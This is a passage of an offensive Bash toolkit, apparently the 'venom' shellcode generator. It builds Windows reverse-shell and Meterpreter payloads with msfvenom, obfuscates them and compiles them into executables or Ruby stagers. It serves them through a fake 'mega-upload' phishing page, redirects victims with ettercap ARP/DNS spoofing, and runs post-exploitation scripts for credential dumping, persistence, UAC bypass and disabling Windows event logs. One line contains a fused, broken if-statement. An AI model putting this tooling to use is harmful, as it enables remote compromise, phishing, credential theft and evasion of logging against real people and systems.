xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n          fi\n        fi\n   fi\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/exec_bin[bak].c $InJEc3 > /dev/null 2>&1\nmv $IPATH/templates/exec_bin2[bak].c $IPATH/templates/exec_bin2.c > /dev/null 2>&1\nmv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1\nmv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1\nmv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $ApAcHe/$N4m.exe > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n# -----------------------------------------------------\n# build shellcode in PSH-CMD format (windows-platforms)\n# using a C template embbebed with powershell shellcode\n# ------------------------------------------------------\nsh_shellcode6 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\n\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/shell_bind_tcp\" FALSE \"windows/shell/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp_dns\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/meterpreter/reverse_winhttps\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 370) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: psh-cmd\" --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"psh-cmd\";fi\n\necho \"[☠] Building shellcode -> psh-cmd format ...\"\nsleep 2\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   echo \"[☠] meterpreter over SSL sellected ..\";sleep 1\nfi\n\necho \"\" > $IPATH/output/chars.raw\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : PSH-CMD -> WINDOWS\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode (msf encoded)\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw\"\nelse\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw\"\nfi\n\n\nstr0=`cat $IPATH/output/chars.raw | awk {'print $12'}`\necho \"$str0\" > $IPATH/output/chars.raw\n# display shellcode\necho \"\"\necho \"[☠] obfuscating -> base64 encoded!\"\nsleep 3\necho $str0\necho \"\" && echo \"\"\n\n\n   # check if all dependencies needed are installed\n   # check if template exists\n   if [ -e $InJEc15 ]; then\n      echo \"[☠] exec_psh.c -> found!\"\n      sleep 2\n   else\n      echo \"[☠] exec_psh.c -> not found!\"\n      exit\n   fi\n\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"[☠] chars.raw  -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw  -> not found!\"\n      exit\n      fi\n\n   # check if mingw32 exists\n   audit=`which $ComP`> /dev/null 2>&1\n   if [ \"$?\" -eq \"0\" ]; then\n      echo \"[☠] mingw32 compiler -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] mingw32 compiler -> not found!\"\n      echo \"[☠] Download compiler -> apt-get install mingw32\"\n      echo \"\"\n      sudo apt-get install mingw32\n      echo \"\"\n      fi\n\n\n# EDITING/BACKUP FILES NEEDED\necho \"[☠] editing/backup files...\"\ncd $IPATH/templates\ncp $InJEc15 $IPATH/templates/exec_psh[bak].c\necho \"[☠] Injecting shellcode -> $N4m.exe!\"\nsleep 2\nsed \"s|InJ3C|$str0|\" exec_psh.c > final.c\n\n\n# COMPILING SHELLCODE USING mingw32\necho \"[☠] Compiling using mingw32...\"\nsleep 2\n# special thanks to astr0baby for mingw32 -mwindows flag :D\n$ComP final.c -o $N4m.exe -mwindows\nmv $N4m.exe $IPATH/output/$N4m.exe\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.exe\\n\\nchose how to deliver: $N4m.exe\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n\n          if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n\n          if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n        fi\n      sleep 2\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"persistence.rc\" FALSE \"privilege_escalation.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 350) > /dev/null 2>&1\n\n  if [ \"$P0\" = \"persistence.rc\" ]; then\n  M1P=$(zenity --entry --title \"☠ AUTO-START PAYLOAD ☠\" --text \"\\nAuto-start payload Every specified hours 1-23\\n\\nexample: 23\\nwill auto-start $N4m.exe on target every 23 hours\" --width 300) > /dev/null 2>&1\n\n    cd $IPATH/aux\n    # Build persistence script (AutoRunStart='multi_console_command -r')\n    cp persistence.rc persistence[bak].rc\n    sed -i \"s|N4m|$N4m.exe|g\" persistence.rc\n    sed -i \"s|IPATH|$IPATH|g\" persistence.rc\n    sed -i \"s|M1P|$M1P|g\" persistence.rc\n\n    # Build listenner resource file\n    echo \"use exploit/multi/handler\" > $lhost.rc\n    echo \"set LHOST $lhost\" >> $lhost.rc\n    echo \"set LPORT $lport\" >> $lhost.rc\n    echo \"set PAYLOAD $paylo\" >> $lhost.rc\n    echo \"exploit\" >> $lhost.rc\n    mv $lhost.rc $IPATH/output/$lhost.rc\n    cd $IPATH\n\n    elif [ \"$P0\" = \"privilege_escalation.rc\" ]; then\n      cd $IPATH/aux\n      # backup files needed\n      cp privilege_escalation.rc privilege_escalation[bak].rc\n      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb\n      # Build resource files needed\n      sed -i \"s|N4m|$N4m.exe|g\" privilege_escalation.rc\n      sed -i \"s|IPATH|$IPATH|g\" privilege_escalation.rc\n      sed -i \"s|N4m|$N4m.exe|g\" enigma_fileless_uac_bypass.rb\n      # reload metasploit database\n      echo \"[☠] copy post-module to msf db!\"\n      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb\n      echo \"[☠] reloading -> Metasploit database!\"\n      xterm -T \" reloading -> Metasploit database \" -geometry 110x23 -e \"sudo msfconsole -x 'reload_all; exit -y'\" > /dev/null 2>&1\n      cd $IPATH\n\n\n  elif [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n\n\n  else\n\n    echo \"do nothing\" > /dev/null 2>&1\n\nfi\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.exe|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.exe|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ]; thenif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n          fi\n\n\n        else\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n          fi\n        fi\n   fi\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/exec_psh[bak].c $InJEc15 > /dev/null 2>&1\nmv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1\nmv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nmv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $IPATH/templates/final.c > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $ApAcHe/$N4m.exe > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n# ------------------------------------------------------------\n# build shellcode in ruby (windows-platforms)\n# veil-evasion ruby payload reproduction (the stager)...\n# ruby_stager (template) by: @G0tmi1k @chris truncker @harmj0y\n# ------------------------------------------------------------\nsh_shellcode7 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\n\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/shell_bind_tcp\" FALSE \"windows/shell/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp_dns\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 350) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: G0tmi1k\" --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"G0tmi1k\";fi\n\necho \"[☠] Building shellcode -> C format ...\"\nsleep 2\necho \"\" > $IPATH/output/chars.raw\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : C -> WINDOWS\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode\nif [ \"$paylo\" = \"windows/x64/meterpreter/reverse_tcp\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw\" > /dev/null 2>&1\nelse\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -i 3 -f c > $IPATH/output/chars.raw\" > /dev/null 2>&1\nfi\n\necho \"\"\n# display generated shelcode\ncat $IPATH/output/chars.raw\necho \"\" && echo \"\"\nsleep 2\n\n   # check if all dependencies needed are installed\n   # check if template exists\n   if [ -e $InJEc4 ]; then\n      echo \"[☠] exec.rb -> found!\"\n      sleep 2\n   else\n      echo \"[☠] exec.rb -> not found!\"\n      exit\n   fi\n\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"[☠] chars.raw -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw -> not found!\"\n      exit\n      fi\n\n\n# EDITING/BACKUP FILES NEEDED\necho \"[☠] editing/backup files...\"\ncp $InJEc4 $IPATH/templates/exec[bak].rb\ncp $InJEc7 $IPATH/templates/hta_attack/index[bak].html\n\n\n   # edit exec.c using leafpad or gedit editor\n   if [ \"$DiStR0\" = \"Kali\" ]; then\n      leafpad $InJEc4 > /dev/null 2>&1\n   else\n      gedit $InJEc4 > /dev/null 2>&1\n   fi\n\n\n     cd $IPATH/templates\n     mv $InJEc4 $IPATH/output/$N4m.rb\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.rb\\n\\nchose how to deliver: $N4m.rb\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n        fi\n      sleep 2\n\n\n   else\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.rb|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.rb $ApAcHe/$N4m.rb > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.rb|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.rb $ApAcHe/$N4m.rb\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed 